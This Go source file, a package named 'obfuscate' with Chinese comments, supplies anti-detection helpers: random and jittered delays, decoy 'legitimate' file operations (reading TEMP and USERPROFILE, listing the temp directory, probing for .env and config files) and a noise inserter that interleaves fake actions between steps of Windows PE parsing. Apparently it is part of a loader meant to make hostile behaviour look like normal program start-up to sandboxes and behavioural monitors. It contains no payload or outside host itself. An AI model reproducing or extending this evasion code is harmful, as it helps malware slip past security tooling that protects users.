package obfuscate

import (
	"math/rand"
	"os"
	"path/filepath"
	"time"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

// RandomDelay 随机延迟 (min ~ max 毫秒)
func RandomDelay(minMs, maxMs int) {
	if maxMs <= minMs {
		return
	}
	delay := minMs + rand.Intn(maxMs-minMs)
	time.Sleep(time.Duration(delay) * time.Millisecond)
}

// JitterDelay 抖动延迟 (baseMs ± 30%)
func JitterDelay(baseMs int) {
	jitter := int(float64(baseMs) * 0.3)
	delay := baseMs - jitter + rand.Intn(2*jitter)
	time.Sleep(time.Duration(delay) * time.Millisecond)
}

// LegitimateFileOps 模拟正常文件操作
func LegitimateFileOps() {
	operations := []func(){
		func() {
			// 读取系统环境变量
			_ = os.Getenv("TEMP")
			_ = os.Getenv("USERPROFILE")
		},
		func() {
			// 获取当前目录
			_, _ = os.Getwd()
		},
		func() {
			// 列举临时目录
			tempDir := os.TempDir()
			_, _ = os.ReadDir(tempDir)
		},
		func() {
			// 检查配置文件是否存在
			configPaths := []string{"config.ini", "settings.json", ".env"}
			for _, path := range configPaths {
				_, _ = os.Stat(path)
			}
		},
	}

	// 随机执行 1-2 个操作
	count := 1 + rand.Intn(2)
	for i := 0; i < count; i++ {
		idx := rand.Intn(len(operations))
		operations[idx]()
		JitterDelay(50)
	}
}

// PrewarmDelay 预热延迟 (模拟程序启动初始化)
func PrewarmDelay() {
	// 1. 随机延迟 1-3 秒
	RandomDelay(1000, 3000)

	// 2. 执行"正常"操作
	LegitimateFileOps()

	// 3. 再次短暂延迟
	JitterDelay(500)
}

// SplitPEParsingOps PE 解析操作混淆器
type SplitPEParsingOps struct {
	stepCount int
}

// NewSplitPEParsingOps 创建 PE 解析混淆器
func NewSplitPEParsingOps() *SplitPEParsingOps {
	return &SplitPEParsingOps{stepCount: 0}
}

// NextStep 执行下一步前的混淆操作
func (s *SplitPEParsingOps) NextStep() {
	s.stepCount++

	// 每 2-3 步插入混淆操作
	if s.stepCount%2 == 0 || s.stepCount%3 == 0 {
		s.insertNoise()
	}

	// 随机延迟
	if rand.Intn(10) < 3 { // 30% 概率延迟
		JitterDelay(50)
	}
}

// insertNoise 插入噪声操作
func (s *SplitPEParsingOps) insertNoise() {
	noises := []func(){
		func() {
			// 假装读取文件
			_, _ = os.Stat("config.ini")
		},
		func() {
			// 获取临时路径
			_ = filepath.Join(os.TempDir(), "dummy.tmp")
		},
		func() {
			// 无意义的数学运算
			dummy := 0
			for i := 0; i < 100; i++ {
				dummy += i * 7 % 13
			}
			_ = dummy
		},
	}

	idx := rand.Intn(len(noises))
	noises[idx]()
}
